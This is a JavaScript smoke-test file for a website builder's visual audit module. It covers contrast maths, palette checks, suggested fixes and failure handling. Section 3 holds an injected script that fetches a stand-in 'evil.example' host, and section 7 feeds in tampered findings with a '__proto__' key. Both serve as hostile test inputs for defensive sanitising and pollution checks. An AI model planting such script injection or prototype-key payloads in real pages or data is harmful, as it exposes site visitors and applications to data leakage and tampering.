#!/usr/bin/env node
'use strict';

/*
  vision-smoke — the copilot's eyes.

  This module reads the *rendered* page, so the way it embarrasses us is
  different from every other audit in the product:

    1. It reports something it did not measure. A contrast ratio over generated
       artwork, or a line length guessed from an average character width, would
       be an invention dressed as a measurement. Every check is asserted to be
       either measured or absent.
    2. It offers a fix that cannot deliver. A palette swap only removes a
       contrast failure if the failing backdrop is a colour the palette owns; a
       narrower column only shortens a line if the arithmetic lands inside the
       comfortable range. Those conditions are asserted, not assumed.
    3. It measures a different site than it names. A rendered section is joined
       back to the model by position *and* type, so a stale index cannot point a
       fix at the wrong section.

  The classification half is pure, so all of that is testable here without a
  browser. The reading half is exercised for its failure modes only — the
  measurement itself is verified live, in the app.
*/

const path = require('path');
const ROOT = path.join(__dirname, '..');
const Vision = require(path.join(ROOT, 'data', 'vision.js'));
const DB = require(path.join(ROOT, 'data', 'db.js'));
const Copilot = require(path.join(ROOT, 'data', 'copilot.js'));

// The palette check must be the product's own, not a local approximation:
// DB.paletteChecks covers four roles (body and secondary text, over the page and
// over a card) and a hand-rolled two-role copy would offer palettes the rest of
// the product calls unsafe.
global.DB = DB;

let failed = 0;
function pass(msg) { console.log('  ✓ ' + msg); }
function fail(msg) { failed++; console.error('  ✗ ' + msg); }
function assert(cond, msg) { cond ? pass(msg) : fail(msg); }
function eq(a, b, msg) {
  a === b ? pass(msg) : fail(msg + ' — got ' + JSON.stringify(a) + ', expected ' + JSON.stringify(b));
}

// ---------------------------------------------------------------
console.log('\n1. Colour maths');
// ---------------------------------------------------------------
{
  eq(Vision.contrast('#000000', '#ffffff'), 21, 'black on white is 21:1');
  eq(Vision.contrast('#ffffff', '#ffffff'), 1, 'a colour on itself is 1:1');
  eq(Vision.contrast('rgb(255,255,255)', 'rgb(0,0,0)'), 21, 'rgb() syntax parses');
  eq(Vision.contrast('#fff', '#000'), 21, 'short hex parses');

  const aa = Vision.contrast('#767676', '#ffffff');
  assert(aa >= 4.5 && aa < 5, '#767676 on white is just inside AA (' + aa + ':1)');

  // A translucent foreground must be composited first. Skipping the composite
  // would understate it, which is the direction that invents failures.
  const translucent = Vision.contrast('rgba(255,255,255,.6)', '#000000');
  const opaque = Vision.contrast('rgb(153,153,153)', '#000000');
  assert(Math.abs(translucent - opaque) < 0.05, 'rgba() is composited over the backdrop (' + translucent + ' vs ' + opaque + ')');

  // Unresolvable syntax must return null, never a black default: oklab() and
  // color-mix() serialise through getComputedStyle and would otherwise be read
  // as 0,0,0 and reported as a real failure.
  eq(Vision.parseColor('oklab(0.7 0.1 0.1)'), null, 'oklab() is unresolvable, not black');
  eq(Vision.contrast('oklab(0.7 0.1 0.1)', '#ffffff'), null, 'an unresolvable colour yields no ratio');
  eq(Vision.contrast('rgb(0,0,0)', 'not-a-colour'), null, 'an unresolvable backdrop yields no ratio');

  const stops = Vision.gradientStops('linear-gradient(120deg,rgb(255,255,255) 20%,color-mix(in srgb,rgb(1,2,3) 70%,rgb(255,255,255)))');
  eq(stops.length, 2, 'gradient stops are extracted from background-clip:text');
  eq(Vision.worstContrast(stops, '#ffffff'), 1, 'the worst stop is the one that decides');
  // A colour-mix that lightens must be read as the colour it paints, not as the
  // dark operand it was mixed from — otherwise the reading is pessimistic.
  eq(Vision.resolveColorMix('color-mix(in srgb,rgb(1,2,3) 70%,rgb(255,255,255))'), 'rgb(77,78,79)',
    'color-mix is resolved to the colour it actually paints');
  eq(Vision.resolveColorMix('linear-gradient(#fff,#eee)'), 'linear-gradient(#fff,#eee)', 'a gradient with no mix is left untouched');
  const dark = Vision.worstContrast(stops, '#000000');
  assert(dark > 2 && dark < 3,
    'the resolved stop over black reads as the grey it is (' + dark + ':1), not as the dark operand it was mixed from');
  eq(Vision.worstContrast(Vision.gradientStops('none'), '#000000'), null, 'no stops means no measurement');
  assert(Vision.worstContrast(Vision.gradientStops('linear-gradient(#fff,#eee)'), '#0b1020') > 15, 'a plain hex gradient is read correctly (the worse of the two stops decides)');
}

// ---------------------------------------------------------------
console.log('\n2. Palette candidates are verified, not assumed');
// ---------------------------------------------------------------
{
  eq(Vision.paletteChecks({ text: '#eee', muted: '#999', bg: '#111', surface: '#222' }).length, 8,
    'the AA check is the product\'s own check, covering the accent text roles too');
  const ok = Vision.aaPalettes(DB.palettes, 'midnight');
  assert(ok.length > 0, ok.length + ' shipped palettes clear that check');
  assert(ok.every((p) => p.id !== 'midnight'), 'the palette already in use is never offered');
  assert(ok.every((p) => Vision.paletteChecks(p).every((c) => c.ratio == null || c.ratio >= 4.5)),
    'every candidate passes every role the render can sit on');
  // Non-vacuity, asserted against a palette that genuinely fails rather than
  // against the shipped catalogue, which is tuned safe and could never prove
  // the filter is doing anything.
  const washed = { id: 'washed', name: 'Washed Out', bg: '#ffffff', surface: '#ffffff', text: '#f2f2f2', muted: '#cccccc' };
  eq(Vision.aaPalettes([washed], 'midnight').length, 0, 'a palette that fails AA is never offered');

  /*
    The defect this whole pass exists to remove: the accent roles were never
    checked, so an eyebrow line and a hero badge shipped below AA on every site
    built with 17 of the 27 palettes. They are now verified on the derived text
    colours the stylesheet actually paints — and the derivation has to hold for
    every shipped palette, not just the one that happened to be measured.
  */
  const brands = DB.palettes.filter((p) => Vision.contrast(p.primary, p.bg) < 4.5 || Vision.contrast(p.accent, p.bg) < 4.5);
  assert(brands.length > 0, brands.length + ' palettes ship a brand accent that is unreadable as text (so this test is not vacuous)');
  DB.palettes.forEach((p) => {
    const roles = DB.textRoles(p);
    const worst = roles.checks.reduce((m, c) => Math.min(m, c.ratio), Infinity);
    assert(worst >= 4.5, 'every text role of ' + p.id + ' clears AA (worst ' + worst.toFixed(2) + ':1)');
    // Hue-preserving, so the brand still looks like the brand.
    assert(String(roles.primary).length === 7 && String(roles.accent).length === 7,
      p.id + ' derives a real colour for each accent text role');
  });
  // The theme toggle repaints the page with its own grounds and would otherwise
  // undo the fix, so the derivation is asserted against those grounds too.
  [['#f6f7fb', '#ffffff', false], ['#0b0e1c', '#161a30', true]].forEach(([bg, surface, dark]) => {
    DB.palettes.forEach((p) => {
      const r = DB.textRoles(p, { bg: bg, surface: surface, dark: dark });
      assert(r.checks.every((c) => c.ratio >= 4.5),
        p.id + ' is legible on the ' + (dark ? 'dark' : 'light') + ' theme ground too');
    });
  });
  // Every palette must still be offered by the generator's AA filter: deriving
  // the roles may not quietly remove a palette from the catalogue.
  const pool = Vision.aaPalettes(DB.palettes, 'noir');
  assert(pool.length >= DB.palettes.length - 1, 'deriving the text roles excludes no palette from the generator pool (' + pool.length + ' of ' + (DB.palettes.length - 1) + ')');
}

// ---------------------------------------------------------------
console.log('\n3. The measured document is inert');
// ---------------------------------------------------------------
{
  const html = '<html><head><link rel="stylesheet" href="https://fonts.example/x.css">'
    + '<style>body{color:red}</style><script>fetch("https://evil.example/?x=1")</script></head>'
    + '<body><img src="https://picsum.photos/seed/a/800/600" alt="">'
    + '<iframe src="https://maps.example/embed"></iframe>'
    + '<video poster="https://cdn.example/p.jpg"><source src="https://cdn.example/v.mp4"></video>'
    + '<a href="https://example.com">x</a></body></html>';
  const clean = Vision.neutralise(html);
  assert(clean.indexOf('<script') === -1, 'no script tag survives — the export cannot run');
  assert(clean.indexOf('evil.example') === -1, 'no script body survives');
  assert(clean.indexOf('picsum.photos') === -1, 'no remote image is fetched');
  assert(clean.indexOf('maps.example') === -1, 'no embed is loaded');
  assert(clean.indexOf('cdn.example') === -1, 'no video source is loaded');
  assert(clean.indexOf('fonts.example') === -1, 'no remote stylesheet is fetched');
  assert(clean.indexOf('color:red') !== -1, 'the page\'s own inline CSS is kept — it is what is being measured');
  // Geometry has to survive: an image with no src collapses, and a collapsed
  // layout measures as a crowded page that is not crowded.
  assert(/<img[^>]+src="data:image\/svg\+xml/.test(clean), 'images keep a blank source so they still lay out');
  assert(/<iframe(?![^>]*src)/.test(clean), 'an iframe keeps its box without a source');
  assert(/<video(?![^>]*poster)/.test(clean), 'a video keeps its box without a poster');
  assert(clean.indexOf('href="https://example.com"') !== -1, 'real links are left alone');
}

// ---------------------------------------------------------------
console.log('\n4. Findings are measured');
// ---------------------------------------------------------------

// A project small enough to reason about, with a real section list.
function fixture() {
  const hero = { id: 'sec_hero1', type: 'hero', layout: 'centered', title: 'Cycle repair in Leeds, done properly', subtitle: 'Same-day service', text: 'We fix bikes.' };
  const features = { id: 'sec_feat1', type: 'features', title: 'What you get', subtitle: 'Three things', text: 'A short sentence about the work.' };
  const home = { id: 'pg-home', name: 'Home', slug: 'index', sections: [hero, features] };
  const project = { id: 'p1', name: 'Leeds Bikes', site: { name: 'Leeds Bikes', palette: 'midnight', pages: [home], sections: home.sections } };
  return { project: project, hero: hero, features: features, home: home };
}

const COPY = {
  hero: [
    { field: 'title', label: 'Headline', options: ['Bike repair, sorted', 'Fix your bike fast', 'Bikes fixed properly'] },
    { field: 'subtitle', label: 'Tagline', options: ['Same-day service'] }
  ],
  features: [{ field: 'title', label: 'Heading', options: ['What we do'] }]
};

function ctxOf(f, extra) {
  return Object.assign({
    palettes: DB.palettes,
    paletteId: 'midnight',
    pages: f.project.site.pages,
    copyOptions: (type) => COPY[type] || []
  }, extra || {});
}

function mobile(slug, texts, extra) {
  return Object.assign({
    slug: slug, name: slug === 'index' ? 'Home' : slug, width: 390, height: 844,
    texts: Object.assign({ contrast: [], tiny: [], count: 10 }, texts || {}),
    controls: { small: [], count: 5 },
    sections: [{ type: 'hero', index: 0, top: 0, bottom: 500, height: 500, pad: 70, isFirst: true }]
  }, extra || {});
}

{
  const f = fixture();
  const found = Vision.analyse([mobile('index', {
    contrast: [{ ratio: 2.1, need: 4.5, text: 'Same-day service', font: 16, fgToken: 'muted', bgToken: 'bg', certain: true, secType: 'hero', secIndex: 0 }]
  })], ctxOf(f));
  const c = found.find((x) => x.id === 'visual-contrast-index');
  assert(!!c, 'a measured contrast failure is reported');
  eq(c.visual.ratio, 2.1, 'the finding quotes the ratio that was measured');
  eq(c.visual.need, 4.5, 'and the threshold it was judged against');
  assert(c.visual.example.indexOf('Same-day') === 0, 'and the text it was measured on');
  assert(c.msg.indexOf('the hero section') !== -1, 'and names the part of the page it is in, rather than "a section"');
  assert(c.visual.palettes.length > 0 && c.visual.palettes.length <= 3, 'it offers AA-safe palettes to switch to');
  // The promise a palette swap makes is that it removes *this* failure, so the
  // candidate has to clear the role pair that failed — not merely the four roles
  // the product's own palette check covers.
  assert(c.visual.palettes.every((p) => Vision.contrast(DB.getPalette(p.id).muted, DB.getPalette(p.id).bg) >= 4.5),
    'every offered palette clears the exact pair that failed (secondary text on the page)');
  assert(c.visual.palettes.every((p) => Vision.paletteChecks(DB.getPalette(p.id)).every((ch) => ch.ratio == null || ch.ratio >= 4.5)),
    'and still passes the product\'s own four-role check');
}

{
  // The role that breaks in practice: an eyebrow or badge painted in --primary
  // or --accent. No palette check in the product looked at those before this
  // audit measured them, so a candidate must be verified against the pair.
  const f = fixture();
  const found = Vision.analyse([mobile('index', {
    contrast: [{ ratio: 3.77, need: 4.5, text: 'What you get', font: 12, fgToken: 'primary', bgToken: 'bg', certain: true, secType: 'features', secIndex: 1 }]
  })], ctxOf(f));
  const c = found.find((x) => x.id === 'visual-contrast-index');
  assert(!!c, 'an eyebrow that fails AA is reported');
  assert(c.visual.palettes.length > 0, 'and palettes are offered for it');
  assert(c.visual.palettes.every((p) => Vision.contrast(DB.getPalette(p.id).primary, DB.getPalette(p.id).bg) >= 4.5),
    'every offered palette clears primary-on-background, the pair that actually failed');
  eq(JSON.stringify(c.visual.roles), JSON.stringify(['primary']), 'the finding records which colour role failed');
}

{
  // A foreground that cannot be attributed to a palette role cannot be repaired
  // by switching palettes, so no palette may be offered for it.
  const f = fixture();
  const found = Vision.analyse([mobile('index', {
    contrast: [{ ratio: 2.0, need: 4.5, text: 'Custom text', font: 14, fgToken: '', bgToken: 'bg', certain: true, secType: 'hero', secIndex: 0 }]
  })], ctxOf(f));
  const c = found.find((x) => x.id === 'visual-contrast-index');
  assert(!!c, 'the failure is still reported');
  eq(c.visual.palettes.length, 0, 'but no palette is offered when the failing colour is not one the palette owns');
}

{
  // Text on the client's own background. No palette swap can be promised for a
  // colour the palette does not own, so no palette action may be offered.
  const f = fixture();
  const found = Vision.analyse([mobile('index', {
    contrast: [{ ratio: 1.9, need: 4.5, text: 'Custom block', font: 15, fgToken: 'text', bgToken: '', certain: true, secType: 'features', secIndex: 1 }]
  })], ctxOf(f));
  const c = found.find((x) => x.id === 'visual-contrast-index');
  assert(!!c, 'the failure is still reported');
  eq(c.visual.palettes.length, 0, 'but no palette is offered for a custom backdrop');
}

{
  // The certainty floor: over generated artwork the backdrop is not knowable, so
  // only text that is unreadable whatever the artwork is may be reported.
  const f = fixture();
  const certain = Vision.analyse([mobile('index', {
    contrast: [{ ratio: 3.1, need: 2.5, text: 'Hero line', font: 44, painted: true, bgToken: '', certain: false, secType: 'hero', secIndex: 0 }]
  })], ctxOf(f));
  eq(certain.filter((x) => /visual-contrast/.test(x.id)).length, 0, '3.1:1 over uncertain artwork is not reported');
  const unreadable = Vision.analyse([mobile('index', {
    contrast: [{ ratio: 1.4, need: 2.5, text: 'Hero line', font: 44, painted: true, bgToken: '', certain: false, secType: 'hero', secIndex: 0 }]
  })], ctxOf(f));
  eq(unreadable.filter((x) => /visual-contrast/.test(x.id)).length, 1, '1.4:1 over the same artwork is reported');
}

// ---------------------------------------------------------------
console.log('\n5. Fixes are provable, and only where they can be');
// ---------------------------------------------------------------
{
  const f = fixture();
  // A long unbreakable run is what forces a phone to scroll sideways, and only
  // wording with no such run can remove it.
  const found = Vision.analyse([mobile('index', {}, {
    overflow: { width: 620, viewport: 390, text: 'https://a-very-long-unbreakable-link.example/x', longest: 45, secType: 'hero', secIndex: 0, right: 620 }
  })], ctxOf(f));
  const o = found.find((x) => /^visual-overflow/.test(x.id));
  assert(!!o, 'a phone that scrolls sideways is reported');
  eq(o.visual.excess, 230, 'and the finding says by how much');
  assert(!!o.visual.alternative && !!o.visual.alternative.value, 'wording with no long run is offered');
  assert(!Vision.hasLongRun(o.visual.alternative.value), 'the offered wording really has no unbreakable run');
}

{
  const f = fixture();
  // Nothing in the words is forcing the scroll — it is a wide block, and no
  // amount of copy swapping removes it. Advice only.
  const found = Vision.analyse([mobile('index', {}, {
    overflow: { width: 700, viewport: 390, text: 'A table of prices', longest: 12, secType: 'hero', secIndex: 0, right: 700 }
  })], ctxOf(f));
  const o = found.find((x) => /^visual-overflow/.test(x.id));
  assert(!!o, 'the sideways scroll is still reported');
  assert(!o.visual.alternative, 'but no wording fix is offered when the words are not the cause');
}

{
  const f = fixture();
  const found = Vision.analyse([mobile('index', {}, {
    hero: { lines: 6, chars: 120, share: 0.8, tappable: false, secType: 'hero', secIndex: 0 }
  })], ctxOf(f));
  const h = found.find((x) => /^visual-hero/.test(x.id));
  assert(!!h, 'a crowded opening is reported');
  assert(h.msg.indexOf('6 lines') !== -1, 'the finding quotes the line count it measured');
  assert(h.msg.indexOf('nothing in the first screen') !== -1, 'and says the first screen has nothing to tap');
  assert(h.visual.alternatives.length > 0, 'shorter openings are offered');
  const hero = f.hero;
  assert(h.visual.alternatives.every((a) => a.value.length <= hero[a.field].length * 0.6),
    'every offered line is short enough to be a real shortening');
  eq(h.visual.sectionId, 'sec_hero1', 'the fix names the section it is about');
}

{
  // The join guard: if the section at that index is no longer the same type, the
  // page has been reordered since the render and no fix may be attached.
  const f = fixture();
  const stale = { id: 'x', name: 'Home', slug: 'index', sections: [{ id: 'sec_other', type: 'stats', title: 'A headline' }, f.features] };
  const found = Vision.analyse([mobile('index', {}, {
    hero: { lines: 6, chars: 120, share: 0.6, tappable: true, secType: 'hero', secIndex: 0 }
  })], { palettes: DB.palettes, paletteId: 'midnight', pages: [stale], copyOptions: (t) => COPY[t] || [] });
  const h = found.find((x) => /^visual-hero/.test(x.id));
  assert(!!h, 'the finding is still reported');
  eq(h.visual.sectionId, '', 'but it carries no section when the render no longer matches the model');
  eq(h.visual.alternatives.length, 0, 'and no fix that would land on the wrong section');
}

{
  const f = fixture();
  // 104 characters at a 1140px column: the arithmetic is what decides whether the
  // narrowing is offered, not the finding itself.
  const fits = Vision.analyse([mobile('index', {}, {
    width: 1280, lines: { chars: 100, lines: 4, text: 'A long paragraph', container: 1140 }
  })], ctxOf(f));
  const l = fits.find((x) => /^visual-lines/.test(x.id));
  assert(!!l, 'a long reading line is reported');
  eq(l.visual.newWidth, 960, 'a column width that lands inside the range is offered');

  const hopeless = Vision.analyse([mobile('index', {}, {
    width: 1280, lines: { chars: 128, lines: 6, text: 'A very long paragraph', container: 1140 }
  })], ctxOf(f));
  const h2 = hopeless.find((x) => /^visual-lines/.test(x.id));
  assert(!!h2, 'an extreme line length is still reported');
  eq(h2.visual.newWidth, 0, 'but no narrowing is offered when it would not be enough');
  // The projection is sound: the offered width really does land in range.
  const projected = l.visual.chars * (l.visual.newWidth / l.visual.container);
  assert(projected <= Vision.LIMIT.longLine, 'the projected line length is inside the comfortable range (' + projected.toFixed(1) + ')');
}

{
  const f = fixture();
  // Section padding comes straight from the design token, so this is the one
  // visual fix that is deterministic — and it is measured on desktop, where the
  // token applies rather than the fixed mobile value.
  const desk = Vision.analyse([mobile('index', {}, {
    width: 1280,
    sections: [
      { type: 'hero', index: 0, top: 0, bottom: 400, height: 400, pad: 32, isFirst: true },
      { type: 'features', index: 1, top: 400, bottom: 800, height: 400, pad: 32 }
    ],
    spacing: { padding: 32, sections: 2 }
  })], ctxOf(f));
  const s = desk.find((x) => /^visual-spacing/.test(x.id));
  assert(!!s, 'crowded sections are reported on desktop');
  eq(s.visual.to, Vision.LIMIT.spacingTo, 'and the fix is the token the renderer reads');
  assert(s.visual.to > s.visual.current, 'the offered value is a real increase');

  const mob = Vision.analyse([mobile('index', {}, {
    sections: [{ type: 'hero', index: 0, top: 0, bottom: 400, height: 400, pad: 32, isFirst: true }],
    spacing: { padding: 32, sections: 1 }
  })], ctxOf(f));
  eq(mob.filter((x) => /^visual-spacing/.test(x.id)).length, 0, 'a phone is not told about a token that does not apply to it');
}

{
  const f = fixture();
  const found = Vision.analyse([mobile('index', {
    tiny: [{ font: 10, text: 'Terms apply', tag: 'small' }]
  }, {
    // One small icon link is noise, so a single offender is deliberately not
    // enough to raise the finding.
    controls: { small: [{ w: 18, h: 18, text: '→', top: 200 }, { w: 22, h: 20, text: '↗', top: 240 }], count: 4 }
  })], ctxOf(f));
  const tiny = found.find((x) => /^visual-tiny/.test(x.id));
  const tap = found.find((x) => /^visual-tap/.test(x.id));
  assert(!!tiny && tiny.level === 'info', 'small print is reported as polish');
  assert(tiny.msg.indexOf('10px') !== -1, 'quoting the size that was measured');
  assert(!!tap && tap.level === 'info', 'small touch targets are reported');
  // Neither has a fix the product can execute, so both must be advice only —
  // the copilot's rule is never a button that does nothing.
  const r = Copilot.review(f.project, { issues: found, score: 0, letter: '', ready: false }, ctxOf(f));
  ['visual-tiny-index', 'visual-tap-index'].forEach((id) => {
    const it = r.items.find((x) => x.id === id);
    assert(!!it, id + ' reaches the review');
    if (!it) return;
    eq(it.action, null, id + ' is advice, not a button');
    assert(!!it.detail, id + ' still explains itself');
  });
}

{
  // The half-promise check: only a real offender is reported, and the ranking
  // puts a visitor-visible failure above polish.
  const f = fixture();
  const found = Vision.analyse([mobile('index', {
    contrast: [{ ratio: 2, need: 4.5, text: 'x', font: 14, fgToken: 'muted', bgToken: 'bg', certain: true, secType: 'hero', secIndex: 0 }],
    tiny: [{ font: 9, text: 'Terms apply', tag: 'small' }]
  })], ctxOf(f));
  assert(found.length === 2, 'both findings are produced');
  assert(/^visual-contrast/.test(found[0].id), 'the contrast failure ranks above the small print');
  assert(found.every((x) => /^visual-/.test(x.id)), 'every finding is namespaced so it cannot collide with the gate');
  assert(found.every((x) => x.level === 'warn' || x.level === 'info'), 'levels are the two the review bands understand');
  assert(found.every((x) => x.msg && x.msg.length > 20), 'every finding carries a sentence, not a code');
  assert(found.every((x) => x.visual && x.visual.page), 'every finding says which page it came from');
}

// ---------------------------------------------------------------
console.log('\n6. Findings run through the copilot and carry runnable fixes');
// ---------------------------------------------------------------
{
  const f = fixture();
  const findings = Vision.analyse([mobile('index', {
    contrast: [{ ratio: 2.1, need: 4.5, text: 'Same-day service', font: 16, fgToken: 'muted', bgToken: 'bg', certain: true, secType: 'hero', secIndex: 0 }],
    tiny: [{ font: 10, text: 'Terms apply', tag: 'small' }]
  }, {
    hero: { lines: 6, chars: 120, share: 0.7, tappable: false, secType: 'hero', secIndex: 0 }
  })], ctxOf(f));
  const r = Copilot.review(f.project, { issues: [], score: 80, letter: 'B', ready: false }, ctxOf(f).pages ? Object.assign(ctxOf(f), { visual: findings }) : {});
  assert(r.items.length === findings.length, 'every visual finding reaches the review');
  assert(r.visual === findings.length, 'and is counted as visual, not as a gate issue');
  assert(r.actionable > 0, 'some of them are actionable');

  const OPS = new Set(['palette', 'font', 'copyOption', 'design', 'hero', 'addSection', 'setField', 'repair', 'images', 'rewrite', 'alt', 'suite']);
  r.items.forEach((it) => {
    if (!it.action) return;
    const act = it.action.act;
    assert(OPS.has(act.op), it.id + ' uses an operation the engine can run (' + act.op + ')');
    assert(typeof it.action.label === 'string' && it.action.label.length > 3, it.id + ' has a label a person can read');
    // Anything offered must also be verifiable, or the receipt cannot say
    // whether it landed.
    const v = Copilot.verifyFor(act);
    assert(v && v.kind && v.kind !== 'none', it.id + ' can be verified after it runs (' + v.kind + ')');
    if (act.op === 'palette') assert(Copilot.sanitiseChoice('palette', act.palette) === act.palette, it.id + ' offers a palette this build ships');
    if (act.op === 'design') {
      assert(['containerWidth', 'spacing', 'radius'].includes(act.key), it.id + ' writes a design token that exists (' + act.key + ')');
      if (act.key === 'containerWidth') assert(act.to >= 960 && act.to <= 1680, it.id + ' stays inside the value the panel clamps to');
      if (act.key === 'spacing') assert(act.to >= 32 && act.to <= 220, it.id + ' stays inside the value the panel clamps to');
    }
    if (act.op === 'copyOption') {
      eq(typeof act.sectionId, 'string', it.id + ' names its section by id, so a moving index cannot misdirect it');
      assert(act.sectionId.length > 0, it.id + ' really names a section');
      assert(['title', 'subtitle', 'text', 'extra'].includes(act.field), it.id + ' writes a section field the engine allows (' + act.field + ')');
      assert(Copilot.sanitiseSectionField(act.field, act.value).ok, it.id + ' writes a value the sanitiser accepts');
    }
  });
}

{
  // Titles. A review card needs a scannable label, and the fallback would be the
  // gate's developer sentence with its first article stripped — which for these
  // findings reads as the body copy repeated.
  const ids = ['visual-contrast-index', 'visual-overflow-index', 'visual-hero-index', 'visual-lines-index', 'visual-tiny-index', 'visual-tap-index', 'visual-spacing-index'];
  const titles = ids.map((id) => Copilot.fixTitleFor({ id: id, msg: 'A sentence.' }));
  titles.forEach((t, i) => assert(typeof t === 'string' && t.length > 4 && t !== 'A sentence', ids[i] + ' has its own headline ("' + t + '")'));
  eq(new Set(titles).size, titles.length, 'and no two of them are the same sentence');
  // Impact ordering: a measured contrast failure must outrank polish.
  assert(Copilot.impactOf('visual-contrast-index') > Copilot.impactOf('visual-tiny-index'), 'contrast outranks small print');
  assert(Copilot.impactOf('visual-overflow-index') > Copilot.impactOf('visual-spacing-index'), 'a sideways-scrolling phone outranks section rhythm');
}

// ---------------------------------------------------------------
console.log('\n7. Hostile input changes nothing');
// ---------------------------------------------------------------
{
  // The audit result is data. A tampered one must not be able to widen what the
  // copilot will write, and must never produce a fix from a prototype key.
  const f = fixture();
  const hostile = [
    // A report cached by an older build can name a palette this build no longer
    // ships, which would otherwise become a button the engine refuses.
    { id: 'visual-contrast-index', level: 'warn', msg: 'x', visual: { kind: 'contrast', page: 'index', palettes: [{ id: '__proto__', name: 'x' }, { id: 'not-a-palette', name: 'y' }] } },
    { id: 'visual-contrast-home', level: 'warn', msg: 'x', visual: { kind: 'contrast', page: 'index', palettes: [{ id: 'rogue', name: 'Removed Palette' }] } },
    { id: 'visual-spacing-index', level: 'info', msg: 'x', visual: { kind: 'spacing', page: 'index', current: 96, to: 0 } },
    { id: 'visual-lines-index', level: 'info', msg: 'x', visual: { kind: 'lines', page: 'index', newWidth: 0 } },
    { id: 'visual-hero-index', level: 'warn', msg: 'x', visual: { kind: 'hero', page: 'index', sectionId: '', alternatives: [{ field: 'title', value: 'hi' }] } },
    { id: 'visual-overflow-index', level: 'warn', msg: 'x', visual: { kind: 'overflow', page: 'index', sectionId: '', alternative: { field: 'title', value: 'hi' } } }
  ];
  const r = Copilot.review(f.project, { issues: hostile, score: 0, letter: '', ready: false }, ctxOf(f));
  eq(r.items.length, hostile.length, 'a tampered finding still reaches the review');
  eq(r.actionable, 0, 'and none of them grows a button');
  // The palette branch is the one that can write, so it is checked separately.
  const pal = Copilot.review(f.project, { issues: [hostile[0]], score: 0, letter: '', ready: false }, ctxOf(f));
  pal.items.forEach((it) => {
    if (!it.action) return;
    assert(Copilot.sanitiseChoice('palette', it.action.act.palette) === it.action.act.palette, 'a bad palette id is refused before it can be written');
    assert(it.action.act.palette !== '__proto__', 'the prototype key cannot survive as a palette');
  });
  // Nothing above may have touched the prototype chain.
  eq({}.polluted, undefined, 'the prototype chain is untouched');
  const proto = Vision.aaPalettes([{ id: '__proto__', text: '#fff', bg: '#000', surface: '#000' }], '');
  assert(proto.every((p) => p.id !== '__proto__' || typeof p === 'object'), 'nothing is read off the prototype by a candidate palette');
  eq(Copilot.sanitiseChoice('palette', '__proto__'), '', 'and the write guard refuses it regardless');
}

// ---------------------------------------------------------------
console.log('\n8. It fails honestly');
// ---------------------------------------------------------------
{
  eq(Vision.available(), false, 'there is no renderer in this environment');
  return Vision.audit({ pages: [{ slug: 'index', name: 'Home', html: '<html></html>' }] }).then((report) => {
    eq(report.ok, false, 'audit() resolves rather than throws without a renderer');
    eq(report.findings.length, 0, 'and reports nothing rather than reporting clean');
    // The shape is the same whether or not a page was measurable, so no caller
    // can mistake an unmeasured report for a clean one.
    eq(report.measured, 0, 'an unmeasured report says it measured nothing');
    eq(report.partial, false, 'and does not claim it is a partial reading of a page it never saw');
    assert(report.expected === 0 || typeof report.expected === 'number', 'the report carries an expected measurement count');
    assert(/renderer|measur/i.test(report.reason), 'and says why: "' + report.reason + '"');
    return Vision.audit({ pages: [] });
  }).then((empty) => {
    eq(empty.ok, false, 'an empty page list is not a clean page either');
    eq(Vision.analyse([], null).length, 0, 'analyse() of nothing is nothing, not a crash');
    eq(Vision.analyse(null, undefined).length, 0, 'and neither is null');
    return Vision.audit({ pages: [{ slug: 'index', name: 'Home', html: '' }] });
  }).then((blank) => {
    eq(blank.ok, false, 'a blank page is not measurable');
    console.log(failed === 0 ? '\nVISION SMOKE PASSED' : '\nVISION SMOKE FAILED: ' + failed);
    process.exit(failed === 0 ? 0 : 1);
  }).catch((e) => {
    fail('the failure path threw: ' + (e && e.message));
    console.log('\nVISION SMOKE FAILED: ' + failed);
    process.exit(1);
  });
}
